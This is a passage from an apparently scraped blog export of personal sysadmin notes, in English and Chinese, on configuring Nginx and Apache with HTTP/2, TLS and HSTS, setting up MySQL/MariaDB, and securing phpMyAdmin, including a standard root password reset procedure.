nginx curl -I -L http://your_domain # -k, --insecure # --cacert, location for cacert # redirect HTTP/1.1 to HTTP(S)/2 # 这里作者笔误，应该是curl HTTP，curl HTTPS直接使用HTTP/2 ❯ curl -k -I -L http://mubuntu-pd.test/ HTTP/1.1 302 Moved Temporarily Server: nginx/1.15.5 (Ubuntu) Date: Wed, 10 Apr 2019 20:16:04 GMT Content-Type: text/html Content-Length: 154 Connection: keep-alive Location: https://mubuntu-pd.test/ HTTP/2 200 server: nginx/1.15.5 (Ubuntu) date: Wed, 10 Apr 2019 20:16:04 GMT content-type: text/html content-length: 612 last-modified: Wed, 10 Apr 2019 17:12:04 GMT etag: \u0026#34;5cae23e4-264\u0026#34; x-frame-options: DENY x-content-type-options: nosniff x-xss-protection: 1; mode=block accept-ranges: bytes   Redirect and HSTP HTTP Strict Transport Security (HSTS)\n Enable HSTS to avoid HTTPS redirection downgrade attacks  enable HTTP Strict Transport Security (HSTS) to avoid having to do those redirects. If the browser finds an HSTS header. 避免HTTP冲定向HTTPS，让浏览器记住协议HTTPS。\nadd Strict-Transport-Security header to make\n1 2 3 4 5 6 7 8 9 10 11 12  # /etc/nginx/nginx.conf # 应用到全局? http { ... ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; add_header Strict-Transport-Security \u0026#34;max-age=15768000\u0026#34; always; # 6 months } ...   这里配置有问题，HSTS需要配置到具体vhost文件的server部分下。\n应用到子域名。\n1 2  # remember HTTPS protocol 6 months add_header Strict-Transport-Security \u0026#34;max-age=15768000; includeSubDomains\u0026#34; always;   check site HSTS status.\nchrome://net-internals/#hsts\nHow can I see which sites have set the HSTS flag in my browser?\n1 2 3  about:profile ~/Library/Application Support/Firefox/Profiles SiteSecurityServiceState.txt   暂时认定自签证书不能使用HSTS。\nNginX 3rd Party Modules  NGINX 3rd Party Modules Nginx with 3rd party modules, homebrew formula ","permalink":"https://blog.pseudocold.com/post/2018/basic-webserver-setup-nginx/","tags":["linux","nginx","mysql","php","h2","tls"],"title":"Basic HTTP2 Setup Part 2: Nginx"},{"categories":["DevOps","Notes"],"contents":"Setup HTTP/2, TLS 1.3 with LAMP. (个人笔记，不做注解)\n个人笔记：涵盖LAMP，LEMP基本配置，HTTPS，TLS 1.3的开启。本地测试推荐mkcert生成自签证书。\nTips:\n 服务器部署默认使用vhost，方便迁移 ciperli.st Homebrew没有使用openssl 1.1作为默认依赖，所以包全部没有tls 1.3支持。（201909 Homebrew官方完成迁移）  Apache Strong Ciphers for Apache, nginx and Lighttpd\nDon\u0026rsquo;t enable preload in HSTS.\nTLS 1.3 and Encrypted SNI check\nInstallation references\n How To Install the Apache Web Server on Ubuntu 18.04 How To Install Linux, Apache, MySQL, PHP (LAMP) stack on Ubuntu 18.04 How To Install and Secure phpMyAdmin on Ubuntu 18.04  1 2 3 4 5 6 7  sudo apt install apache2 sudo ufw app list sudo ufw allow in \u0026#34;Apache Full\u0026#34; hostname -I sudo systemctl reload apache2 # reload conf   Setup virtual hosts (可选)\n1 2 3  sudo mkdir -p /var/www/example.com/html sudo chown -R $USER:$USER /var/www/example.com/html sudo chmod -R 755 /var/www/example.com   1 2 3 4 5 6 7 8 9  \u0026lt;!-- vim /var/www/example.com/html/index.html --\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome to Example.com!\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Success! The example.com server block is working!\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   1 2 3 4 5 6 7 8 9  # /etc/apache2/sites-available/example.com.conf \u0026lt;VirtualHost *:80\u0026gt; ServerAdmin admin@example.com ServerName example.com ServerAlias www.example.com DocumentRoot /var/www/example.com/html ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined \u0026lt;/VirtualHost\u0026gt;   1 2 3 4 5  sudo a2ensite example.com.conf sudo a2dissite 000-default.conf sudo apache2ctl configtest sudo systemctl restart apache2   MySQL Install MySQL and config it. switch its authentication method from auth_socket to mysql_native_password. Otherwise sudo mysql will login automatically.\nEnable PHP with mod_php 1  sudo apt install php libapache2-mod-php php-mysql   Use index.php as the 1st index file.\n1 2 3 4 5 6 7  # /etc/apache2/mods-enabled/dir.conf \u0026lt;IfModule mod_dir.c\u0026gt; DirectoryIndex index.php index.html index.cgi index.pl index.xhtml index.htm \u0026lt;/IfModule\u0026gt; # sudo systemctl restart apache2   1  sudo apt install php-cli   Test PHP with info.php\n1 2 3 4  # /var/www/html/info.php \u0026lt;?php phpinfo(); ?\u0026gt;  phpMyAdmin  phpMyAdmin from arch wiki  1 2 3 4 5  sudo apt install phpmyadmin php-mbstring php-gettext # choose apache2, use dbconfig-common sudo phpenmod mbstring sudo systemctl restart apache2   Secure phpMyAdmin with HTTP basic auth. .htaccess\n1 2 3 4 5 6 7  # /etc/apache2/conf-available/phpmyadmin.conf \u0026lt;Directory /usr/share/phpmyadmin\u0026gt; Options FollowSymLinks DirectoryIndex index.php AllowOverride All # add this to enable .htaccess # sudo systemctl restart apache2   1 2 3 4 5  # /usr/share/phpmyadmin/.htaccess, chmod 644 AuthType Basic AuthName \u0026#34;Restricted Files\u0026#34; AuthUserFile /etc/phpmyadmin/.htpasswd Require valid-user   1 2 3 4  sudo htpasswd /etc/phpmyadmin/.htpasswd {username} # -c create, otherwise use existing .htpasswd file chmod 644   Related Files  /var/www/html, default web content, can be changed by conf files  1 2 3 4 5 6 7 8 9 10 11 12  ❯ tree /etc/apache2 -L 1 /etc/apache2 ├── conf-available # conf fragments belonging in a virtual host ├── conf-enabled # a2enconf ├── mods-available # .load contain fragments to load specific modules ├── mods-enabled # a2enmod ├── sites-available # per-site virtual hosts ├── sites-enabled # a2ensite ├── apache2.conf ├── envvars ├── magic └── ports.conf    /var/log/apache2/access.log /var/log/apache2/error.log  Debug 1 2 3 4 5  apachectl configtest apachectl start/stop # equivalent to -k start apachectl reload apachectl graceful # restart without terminate request processing   Apache htaccess Basic Auth How To Install and Secure phpMyAdmin on Ubuntu 18.04\n1 2 3 4 5 6 7 8  # /usr/share/phpmyadmin/.htaccess AuthType Basic AuthName \u0026#34;Restricted Files\u0026#34; AuthUserFile /etc/phpmyadmin/.htpasswd Require valid-user # chmod 644 .htaccess sudo htpasswd -c /etc/phpmyadmin/.htpasswd {username} # for basis auth only   Let\u0026rsquo;s Encrypt Ubuntu references\n How To Secure Apache with Let\u0026rsquo;s Encrypt on Ubuntu 18.04 certbot docs  Install certbot\n1 2 3  sudo add-apt-repository ppa:certbot/certbot sudo apt update sudo apt install python-certbot-apache   vhost example.com\n1 2 3 4 5  sudo nano /etc/apache2/sites-available/example.com.conf # ServerName example.com; sudo apache2ctl configtest sudo systemctl reload apache2   firewall\n1 2  sudo ufw status verbose sudo ufw allow in \u0026#39;Apache Full\u0026#39;   obtain SSL certificate\n1 2 3 4 5 6 7  sudo certbot --apache -d example.com -d www.example.com IMPORTANT NOTES: - Congratulations! Your certificate and chain have been saved at: /etc/letsencrypt/live/example.com/fullchain.pem Your key file has been saved at: /etc/letsencrypt/live/example.com/privkey.pem   Your certificates are downloaded, installed, and loaded automatically.\nThe certbot package we installed takes care of renewal for us by adding a renew script to /etc/cron.d.\nCustom SSL Certificate Note:\n OCSP stapling is only implemented for managed ACME certificates  macOS macOS httpd 和 apache 的配置好像有点不同，尽管都是同一种服务器。\nmacOS 10.14 Mojave Apache Setup: SSL\n enable necessary modules  1 2 3 4  # /usr/local/etc/httpd/httpd.conf LoadModule socache_shmcb_module ... LoadModule ssl_module ... Include /usr/local/etc/httpd/extra/httpd-ssl.conf   Global SSL conf: port, cert, key  1 2 3 4 5 6 7 8 9 10 11  # /usr/local/etc/httpd/extra/httpd-ssl.conf Listen 443 \u0026lt;VirtualHost _default_:443\u0026gt; # General setup for the virtual host #DocumentRoot \u0026#34;/usr/local/var/www\u0026#34; #ServerName www.example.com:443 SSLCertificateFile \u0026#34;/usr/local/share/mkcert/example.test+4.pem\u0026#34; SSLCertificateKeyFile \u0026#34;/usr/local/share/mkcert/example.test+4-key.pem\u0026#34;   add conf for each virtual host individually (if needed)  1 2 3 4 5 6 7 8  # /usr/local/etc/httpd/extra/httpd-vhosts.conf \u0026lt;VirtualHost *:443\u0026gt; DocumentRoot \u0026#34;/usr/local/var/www\u0026#34; ServerName localhost SSLEngine on SSLCertificateFile \u0026#34;/usr/local/share/mkcert/example.test+4.pem\u0026#34; SSLCertificateKeyFile \u0026#34;/usr/local/share/mkcert/example.test+4-key.pem\u0026#34; \u0026lt;/VirtualHost\u0026gt;   Ubuntu references\n How To Create a Self-Signed SSL Certificate for Apache in Ubuntu 18.04  Use recommended SSL parameters from cipherli.st.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  # /etc/apache2/conf-available/ssl-params.conf SSLCipherSuite EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH SSLProtocol All -SSLv2 -SSLv3 -TLSv1 -TLSv1.1 # remove ancient protocols SSLHonorCipherOrder On # Disable preloading HSTS for now. You can use the commented out header line that includes # the \u0026#34;preload\u0026#34; directive if you understand the implications. # Header always set Strict-Transport-Security \u0026#34;max-age=63072000; includeSubDomains; preload\u0026#34; Header always set X-Frame-Options DENY Header always set X-Content-Type-Options nosniff # Requires Apache \u0026gt;= 2.4 SSLCompression off SSLUseStapling on SSLStaplingCache \u0026#34;shmcb:logs/stapling-cache(150000)\u0026#34; # Requires Apache \u0026gt;= 2.4.11 SSLSessionTickets Off   注意：homebrew httpd 可能不支持tls 1.3. 同curl中tls 1.3支持问题一样，需要使用openssl@1.1.\nSSL vhosts\n1 2 3 4 5 6 7  # /etc/apache2/sites-available/default-ssl.conf # add conf below ServerAdmin your_email@example.com ServerName server_domain_or_IP SSLCertificateFile /etc/ssl/certs/apache-selfsigned.crt SSLCertificateKeyFile /etc/ssl/private/apache-selfsigned.key   redirect HTTP to HTTPS\n1 2 3  # /etc/apache2/sites-available/000-default.conf Redirect \u0026#34;/\u0026#34; \u0026#34;https://your_domain/\u0026#34; # 302 # Redirect permanent \u0026#34;/\u0026#34; \u0026#34;https://your_domain/\u0026#34; # 301   上面重定向到HTTPS写得太烂，host不具有兼容性，参看后面HSTS示例中重定向。\nfirewall\n1 2 3  sudo ufw app list sudo ufw allow in \u0026#34;Apache Full\u0026#34; sudo ufw status verbose   Enable apache2 modules, conf, changes\n1 2 3 4 5 6 7  sudo a2enmod ssl # mod_ssl sudo a2enmod headers #needed by some of the settings in our SSL snippet sudo a2ensite default-ssl sudo a2enconf ssl-params sudo apache2ctl configtest sudo systemctl restart apache2   HTTP/2 references\n Apache HTTP/2 guide How to enable HTTP/2 support in Apache from http2.pro PHP on apache httpd 2.4.x using mod_proxy_fcgi and php-fpm Apache httpd 2.4.x 使用 mod_proxy_fcgi 和 PHP-FPM 的各种方式比较  Terms\n HTTP/2 is a binary protocol h2 is HTTP/2 over TLS (protocol negotiation via ALPN). h2c is HTTP/2 over TCP. h2c is HTTP/2 over cleartext (http:) A frame is the smallest unit of communication within an HTTP/2 connection, consisting of a header and a variable-length sequence of octets structured according to the frame type. A stream is a bidirectional flow of frames within the HTTP/2 connection. HTTP/2 is able to run multiple streams of data over the same TCP connection, avoiding the classic HTTP 1.1 head of blocking slow request and avoiding to re-instantiate TCP connections for each request/response (KeepAlive patched the problem in HTTP 1.1 but did not fully solve it). 避免头阻塞，重用TCP连接 mpm, multi-processing modules  Note: Speaking of SSL, you need to be aware that most browsers will speak HTTP/2 only on https: URLs. Several of the non-browser client implementations support HTTP/2 over cleartext, h2c. The most versatile being curl.\n1 2 3 4 5 6 7  # /usr/local/etc/http/httpd.conf LoadModule http2_module modules/mod_http2.so Protocols h2 http/1.1 # Protocols h2 h2c http/1.1 # ignore client\u0026#39;s preferences # ProtocolsHonorOrder Off   Problem of mod_mpm_prefork  In prefork, mod_http2 will only process one request at at time per connection. But clients, such as browsers, will send many requests at the same time.\nIf your setup can handle it, configuring event mpm is nowadays the best one (if supported on your platform).\n macOS Enable php-fpm, disable mod_php first.\n1 2 3 4  # /usr/local/etc/http/httpd.conf # enable prerequsite LoadModule proxy_module modules/mod_proxy.so LoadModule proxy_fcgi_module modules/mod_proxy_fcgi.so   Activate php-fpm with SetHandler\n1 2 3 4 5 6 7  # /etc/php-fpm.d/www.conf listen = 127.0.0.1:9000 # /usr/local/etc/http/httpd.conf \u0026lt;FilesMatch \\.php$\u0026gt; SetHandler \u0026#34;proxy:fcgi://127.0.0.1:9000\u0026#34; \u0026lt;/FilesMatch\u0026gt;   php-fpm监听\n listen on /run/php/php7.2-fpm.sock in Linux (/etc/php/7.2/fpm/pool.d/www.conf) 127.0.0.1:9000 on macOS (/usr/local/etc/php/7.3/php-fpm.d/www.conf.default)  检查 info.php 中\u0026quot;Server API\u0026quot;, \u0026ldquo;SERVER_SOFTWARE\u0026quot;字段。\nLinux Linux 下无需手动配置，a2enmod, a2dismod即可完成大部分操作。\n1 2 3 4 5 6 7 8 9 10 11  apachectl stop a2enmod http2 apt-get install php-fpm # Install the php-fpm from your PHP repository. This package name depends on the vendor. # php7.2-fpm.service, auto enabled a2enmod proxy_fcgi setenvif a2enconf php7.1-fpm # Again, this depends on your PHP vendor. a2dismod php7.1 # This disables mod_php. a2dismod mpm_prefork # This disables the prefork MPM. Only one MPM can run at a time. a2enmod mpm_event # Enable event MPM. You could also enable mpm_worker. apachectl start   HTTP/2 Server Push 响应头包含以下即可\n1  Link: \u0026lt;/assets/styles.css\u0026gt;;rel=preload, \u0026lt;/assets/scripts.css\u0026gt;; rel=preload   1 2 3 4 5  # config \u0026lt;Location /index.htmll\u0026gt; Header add Link \u0026#34;\u0026lt;/assets/styles.css\u0026gt;;rel=preload, \u0026lt;/assets/scripts.css\u0026gt;; rel=preload\u0026#34; Header add Link \u0026#34;\u0026lt;/assets/image.jpg\u0026gt;;rel=preload\u0026#34; \u0026lt;/Location\u0026gt;   Redirect and HSTS Configure HSTS (HTTP Strict Transport Security) for Apache and Nginx\n1 2 3  # Load modules (or use the IfModule) LoadModule headers_module modules/mod_headers.so LoadModule rewrite_module modules/mod_rewrite.so   Rewrite HTTP connections and redirect them to HTTPS:\n1 2 3 4 5 6  # Redirect HTTP connections to HTTPS \u0026lt;IfModule mod_rewrite.c\u0026gt; RewriteEngine On RewriteCond %{HTTPS} off RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L] \u0026lt;/IfModule\u0026gt;   Now configure the virtual host:\n1 2 3 4  \u0026lt;VirtualHost 192.168.1.1:443\u0026gt; Header always set Strict-Transport-Security \u0026#34;max-age=15768000; includeSubDomains\u0026#34; # 6 months # 31536000 # 1y \u0026lt;/VirtualHost\u0026gt;   FAQ Could not reliably determine the server\u0026rsquo;s fully qualified domain name 缺少默认/全局ServerName设置。\n1 2  # /etc/apache2/apache2.conf ServerName localhost   Hide Server Infomation 1 2 3  ServerSignature Off # hide info like Apache and PHP versions ServerTokens Prod # least info   ","permalink":"https://blog.pseudocold.com/post/2018/basic-webserver-setup-apache/","tags":["linux","apache","mysql","php","h2","tls"],"title":"Basic HTTP2 Setup Part 1: Apache"},{"categories":["DevOps"],"contents":"What\u0026rsquo;s the difference between [mysql] and [client] group in /etc/my.cnf. Here is it.\nMySQL Option Groups  [mysqld], mysqld server [mysqld-8.0], version specific [mysql], mysql client program [client], for all clients, including mysqldump Options specified later override options specified earlier  Example\n1 2 3 4 5 6 7 8 9 10 11 12  [client] port=3306 socket=/tmp/mysql.sock [mysqld] port=3306 socket=/tmp/mysql.sock key_buffer_size=16M max_allowed_packet=128M [mysqldump] quick   MariaDB Option Groups  [client-server], mariadb clients and server [server], mariadb server [mysqld], read by mysqld, which includes both MariaDB server and MySQL server [galera], for mariadb server compiled with Galera Cluster support [client], all mariadb and mysql client programs, like mysqldump [client-mariadb], read by mariadb clients  References  MySQL option groups MariaDB option groups ","permalink":"https://blog.pseudocold.com/post/2018/mysql-mariadb-option-groups/","tags":["mysql","mariadb"],"title":"MariaDB/MySQL Option Groups"},{"categories":["DevOps"],"contents":"MariaDB, MySQL安装配置全指南。MySQL语法参考笔记《MySQL必知必会》读书笔记。\nMariaDB is an alternative to MySQL.\nMySQL, MariaDB 并不相同，很多配置项不一致。\nDifferences Between MariaDB and MySQL MariaDB是MySQL fork，在MySQL被Oracle收购后分支。\n The InnoDB storage engine by Oracle was also forked by Percona as XtraDB. The fork is used by both MariaDB and Percona Server.\n 实际从MariaDB 10.2开始，又换回InnoDB作为默认分支。\n MariaDB vs MySQL – Comparing MySQL 8.0 with MariaDB 10.3  What\u0026rsquo;s New 8.0  MySQL8.0新特性——默认使用caching_sha2_password作为身份验证插件 MySQL 8.0 正式版 8.0.11 发布：比 MySQL 5.7 快 2 倍  caching_sha2_password 代替 mysql_native_password 密码加密作为默认。原有账户的加密方式保持不变。\n改变某用户的验证方式，\n1 2  ALTERUSERuserIDENTIFIEDWITHcaching_sha2_passwordBY\u0026#39;password\u0026#39;;ALTERUSER\u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39;IDENTIFIEDWITHmysql_native_passwordBY\u0026#39;password\u0026#39;;  change default_authentication_plugin\n1 2 3  # my.cnf [mysqld] default_authentication_plugin=mysql_native_password   MySQL 8 开始，使用 utf8mb4 作为 MySQL 的默认字符集。\nMySQL 从 5.7 版本开始提供 NoSQL 存储功能，目前在 8.0 版本中这部分功能也得到了更大的改进。\nReferences  setup on Debian 10 MariaDB from archlinux wiki  Installation/Setup ArchLinux 建议更改存储路径。\n1  mariadb-install-db --user=mysql --basedir=/usr --datadir=/var/lib/mysql    For security reasons, the systemd service file contains ProtectHome=true, which prevents MariaDB from accessing files under the /home, /root and /run/user hierarchies. The datadir has to be in an accessible location and owned by the mysql user and group.\n 1 2 3 4 5  sudo apt update sudo apt install mariadb-server sudo mysql_secure_installation # enter, not root password # don\u0026#39;t setup a root account   the root account for MariaDB is tied closely to automated system maintenance, so we should not change the configured authentication methods for that account.\nremove some anonymous users and the test database\ndisable remote root logins, and load these new rules so that MariaDB immediately respects the changes you have made.\n1 2 3  # check installation sudo mysql mysql\u0026gt; SELECT user,authentication_string,plugin,host FROM mysql.user;   user auth and privileges In Debian systems running MariaDB 10.3, the root MariaDB user is set to authenticate using the unix_socket plugin by default rather than with a password. （MariaDB root密码验证方式不一致）\nroot不使用密码验证，所以需要一个替代的管理员账户。\n直接修改 /etc/mysql/debian.cnf 之后会被覆盖，\ncreate a new account called admin with the same capabilities as the root account, but configured for password authentication.\n1 2 3 4 5 6  sudo mysql # config an account with password auth GRANT ALL ON *.* TO \u0026#39;admin\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;password\u0026#39; WITH GRANT OPTION; FLUSH PRIVILEGES; exit   1 2 3 4 5 6 7  sudo systemctl status mariadb # connect the database with mysqladmin tool sudo mysqladmin version # test auth mysqladmin -u admin -p version   Conf Conf Location 1 2 3 4  mysqld --help --verbose | less ... /etc/my.cnf /etc/my.cnf.d/ ~/.my.cnf ...   Remote Access   SSH本地转发，利用数据库客户端代理连接到本地端口\n  在服务器上暴露3306端口，创建专门用于远程连接的账户。\n  Bind to wan.\n1 2 3 4 5 6  [mysqld] ... # uncheck skip-netwoking to disable remote access #skip-networking bind-address = \u0026lt;some ip-address\u0026gt; ...   Create account for specific database, and grant remote access for that account.\n1 2 3 4 5 6 7  mysql -u root -p # check remote access privileged select user, host from mysql.user where host \u0026lt;\u0026gt; \u0026#39;lodalhost\u0026#39;; # grant remote privileges grant all privileges on dbname.* to \u0026#39;account\u0026#39;@\u0026#39;192.168.1.%\u0026#39; identified by \u0026#39;pasword\u0026#39; with grant option;   auto-completion disabled by default. Enable in the client conf, /etc/mysql/my.cnf,\n1 2  [mysql] auto-rehash   utf8mb4 Note: make a backup before changing the character set.\n The mariadb package already uses utf8mb4 as charset and utf8mb4_unicode_ci as collation. Users using the default (character) settings may want to skip this section.\n utf8mb8 is compatible with utf8, with additional unicode support.\n1 2 3 4 5 6 7 8 9 10  # /etc/mysql/my.cnf [client] default-character-set = utf8mb4 [mysqld] collation_server = utf8mb4_unicode_ci character_set_server = utf8mb4 [mysql] default-character-set = utf8mb4   tmpdir with a TMPFS （暂时不使用，确认有需求后再说。wiki中100M大小可能仅作为示例）\n The directory used by MySQL for storing temporary files is named tmpdir. For example, it is used to perform disk based large sorts, as well as for internal and explicit temporary tables.\n 为避免 \u0026lsquo;tmpdir\u0026rsquo; 分区（默认为 /tmp下）被塞爆，使用专门的临时存储位置。据Archlinux教程，只创建了100M的临时文件分区用于数据库，推测只是为了避免与其他临时文件冲突。\ntmpfs\n tmpfs is a temporary filesystem that resides in memory and/or swap partition(s). Mounting directories as tmpfs can be an effective way of speeding up accesses to their files, or to ensure that their contents are automatically cleared upon reboot.\n TMPFS使用内存或者交换分区加快读写速度。\nWhere MySQL Stores Temporary Files\n On Unix, MySQL uses the value of the TMPDIR environment variable as the path name of the directory in which to store temporary files. If TMPDIR is not set, MySQL uses the system default, which is usually /tmp, /var/tmp, or /usr/tmp.\nOn Windows, Netware and OS2, MySQL checks in order the values of the TMPDIR, TEMP, and TMP environment variables. For the first one found to be set, MySQL uses it and does not check those remaining. If none of TMPDIR, TEMP, or TMP are set, MySQL uses the Windows system default, which is usually C:\\windows\\temp.\n 1  showvariableslike\u0026#39;tmpdir\u0026#39;;  1 2 3 4 5 6 7  # create a dir with approriate perm, writable by mysql user mkdir -pv /var/lib/mysqltmp chown mysql:mysql /var/lib/mysqltmp # check id, gid of the mysql user and group $ id mysql uid=27(mysql) gid=27(mysql) groups=27(mysql)   Mount tmpfs for \u0026lsquo;tmpdir\u0026rsquo; in /etc/fstab\n1  tmpfs /var/lib/mysqltmp tmpfs rw,gid=27,uid=27,size=100M,mode=0750,noatime 0 0   Populate time zone tables Created automatically, but not populated. Used in CONVERT_TZ() sql queries.\n1  mysql_tzinfo_to_sql /usr/share/zoneinfo | mysql -u root -p mysql   Db Maintenance Upgrade db to next majaor release  keep the old daemon running upgrade the pkg run mysql_upgrade restart the daemon  1  mysql_upgrade -u root -p   Check, Optimize, Repair the DB mysqlcheck\n1 2 3 4 5 6 7 8 9 10  # check all mysqlcheck --all-databases -u root -p -c # analyze all mysqlcheck --all-databases -u root -p -a # repair # -r # optimize, -o   Backup 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  # for InnoDB mysqldump --single-transaction --flush-logs --master-data=2 --all-databases -u root -p \u0026gt; all_databases.sql # backup with compression，其实就是管道加gzip mysqldump --single-transaction --flush-logs --master-data=2 --all-databases -u root -p | gzip \u0026gt; all_databases.sql.gz # reload it into server zcat all_databases.sql.gz | mysql -u root -p # simple example mysqldump -u usrname -p database_name \u0026gt; data-dump.sql # create a db before importing, 导入数据前先要有一个数据库存在 # mysq -u root -p # create database new_database; mysql -u username -p new_database \u0026lt; data-dump.sql   Adminer comparision with phpmyadmin\n单文件，静态\nphpMyAdmin 压根就不要用这种面板，直接SSH本地转发，使用mysql客户端。要用也用Adminer。\n 开启服务 配置  phpmyadmin禁止root登录   Nginx，Apache 访问控制。  改名，非 pma子域名，或者子文件夹 限制隐藏文件的访问，参考Ubuntu phpMyAdmin配置 只允许本地访问，然后使用SSH本地转发 或者，只允许特定IP范围访问，加入基础认证    Tutorials\n How To Install and Secure phpMyAdmin on Ubuntu 18.04 (Apache) How to Install and Secure phpMyAdmin with Nginx on an Ubuntu 18.04 server phpmyadmin.net phpMyAdmin 文档  禁止root登录phpmyadmin 1 2 3 4 5  # sudo nano /etc/phpmyadmin/conf.d/pma_secure.php  $cfg[\u0026#39;Servers\u0026#39;][$i][\u0026#39;auth_type\u0026#39;] = \u0026#39;cookie\u0026#39;; $cfg[\u0026#39;Servers\u0026#39;][$i][\u0026#39;AllowNoPassword\u0026#39;] = false; # * $cfg[\u0026#39;Servers\u0026#39;][$i][\u0026#39;AllowRoot\u0026#39;] = false; # *   Nginx Access Control 1 2  sudo apt install phpmyadmin sudo ln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin   Basic Auth 1 2 3 4 5  openssl passwd # generate a password like \u0026#34;O5az.RSPzd.HE\u0026#34; sudo nano /etc/nginx/pma_pass # sammy:O5az.RSPzd.HE   Enable basic auth.\n1 2 3 4 5 6 7 8 9 10 11  server { . . . location /nothingtosee { auth_basic \u0026#34;Admin Login\u0026#34;; auth_basic_user_file /etc/nginx/pma_pass; } . . . }   SSH Tunnel and IP Limit 利用 allow, deny 做访问控制。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  server { . . . location /nothingtosee { satisfy all; #requires both conditions  allow 203.0.113.111; #allow your IP  allow 127.0.0.1; #allow localhost via SSH tunnels  deny all; #deny all other sources  auth_basic \u0026#34;Admin Login\u0026#34;; auth_basic_user_file /etc/nginx/pma_pass; } . . . }   1 2 3 4  # local forwarding ssh user@server_domain_or_IP -L 8000:localhost:80 -L 8443:localhost:443 -N # -N, do not execute remote commands. 即不打开交互式shell # -f, run in bg   Apache Access Control 1 2  sudo apt install phpmyadmin php-mbstring php-gettext sudo phpenmod mbstring   Basic Auth 1 2 3 4 5 6  # /etc/apache2/conf-available/phpmyadmin.conf \u0026lt;Directory /usr/share/phpmyadmin\u0026gt; Options FollowSymLinks DirectoryIndex index.php AllowOverride All # enable .htaccess . . .   1 2 3 4 5 6 7  # /usr/share/phpmyadmin/.htaccess AuthType Basic AuthName \u0026#34;Restricted Files\u0026#34; AuthUserFile /etc/phpmyadmin/.htpasswd # only authenticated users should be given access Require valid-user   1 2 3 4 5  # create .htaccess file sudo htpasswd -c /etc/phpmyadmin/.htpasswd username # add an additional user sudo htpasswd /etc/phpmyadmin/.htpasswd additionaluser   File Access Control 禁止访问某些文件\n .md、README、Changelog, etc setup, basic auth templates, libraies, setup/lib  参考\n phpMyAdmin from archlinux wiki 也可以参考Ubuntu中phpmyadmin包配置  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  server { server_name domain.tld; listen 443 ssl http2; listen [::]:443 ssl http2; index index.php; access_log /var/log/nginx/domain.tld.access.log; error_log /var/log/nginx/domain.tld.error.log; root /srv/http/domain.tld; location / { try_files $uri $uri/ =404; } location /phpMyAdmin { root /usr/share/webapps/phpMyAdmin; } # Deny static files  location ~ ^/phpMyAdmin/(README|LICENSE|ChangeLog|DCO)$ { deny all; } # Deny .md files  location ~ ^/phpMyAdmin/(.+\\.md)$ { deny all; } # Deny setup directories  location ~ ^/phpMyAdmin/(doc|sql|setup)/ { deny all; } ... }   From Ubuntu 18.04\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  # Authorize for setup \u0026lt;Directory /usr/share/phpmyadmin/setup\u0026gt; \u0026lt;IfModule mod_authz_core.c\u0026gt; \u0026lt;IfModule mod_authn_file.c\u0026gt; AuthType Basic AuthName \u0026#34;phpMyAdmin Setup\u0026#34; AuthUserFile /etc/phpmyadmin/htpasswd.setup \u0026lt;/IfModule\u0026gt; Require valid-user \u0026lt;/IfModule\u0026gt; \u0026lt;/Directory\u0026gt; # Disallow web access to directories that don\u0026#39;t need it \u0026lt;Directory /usr/share/phpmyadmin/templates\u0026gt; Require all denied \u0026lt;/Directory\u0026gt; \u0026lt;Directory /usr/share/phpmyadmin/libraries\u0026gt; Require all denied \u0026lt;/Directory\u0026gt; \u0026lt;Directory /usr/share/phpmyadmin/setup/lib\u0026gt; Require all denied \u0026lt;/Directory\u0026gt;   Tips Reset Password How To Reset Your MySQL or MariaDB Root Password on Ubuntu 18.04\n检查 root 登录  On fresh Ubuntu 18.04 installations, the default MySQL or MariaDB configuration usually allows you to access the database (with full administrative privileges) without providing a password as long as you make the connection from the system’s root account.\n 默认情况下使用root账户（机器账户）是没有密码的，可以直接登录数据库。\ntry sudo mysql before resetting the password for db access.\nprerequisite: account with sudo right. sudo -v\nStop db service 1 2  # stop the db services sudo systemctl stop mariadb   Start the Db without grant table Solution: running mysql withou permission checking, namely without loading the \u0026ldquo;grant\u0026rdquo; table. Then you can login in with root account without a passwd\nMariaDB only, disable loading grant table\n1 2 3  sudo systemctl set-environment MYSQLD_OPTS=\u0026#34;--skip-grant-table --skip-networking\u0026#34; # 其实也可以写到配置里 sudo systemctl start mariadb   MySQL only with service overrides.\n1  sudo systemctl edit mysql   1 2 3 4 5  [Service] # clear the default value ExecStart= # new ExecStart=/usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid --skip-grant-tables --skip-networking   1 2 3  # reload the new service def sudo systemctl daemon-reload sudo systemctl start mysql   Reset password 1 2 3 4  sudo mysql -u root # load the grant table after login into db, otherwise we\u0026#39;re unable to execute commands altering data flush privileges;   MariaDB doesn\u0026rsquo;t use authentication_string.\n1 2 3 4 5  UPDATEmysql.userSETpassword=PASSWORD(\u0026#39;new_password\u0026#39;)WHEREuser=\u0026#39;root\u0026#39;;#incaseyouchangedthedefaultauthmechanismUPDATEmysql.userSETauthentication_string=\u0026#39;\u0026#39;WHEREuser=\u0026#39;root\u0026#39;;UPDATEmysql.userSETplugin=\u0026#39;\u0026#39;WHEREuser=\u0026#39;root\u0026#39;;  MySQL still use the auth string\n1 2  UPDATEmysql.userSETauthentication_string=PASSWORD(\u0026#39;new_password\u0026#39;)WHEREuser=\u0026#39;root\u0026#39;;UPDATEmysql.userSETplugin=\u0026#39;mysql_native_password\u0026#39;WHEREuser=\u0026#39;root\u0026#39;;  Revert systemd changes 1 2 3 4 5 6 7 8  # for mariadb sudo systemctl unset-environment 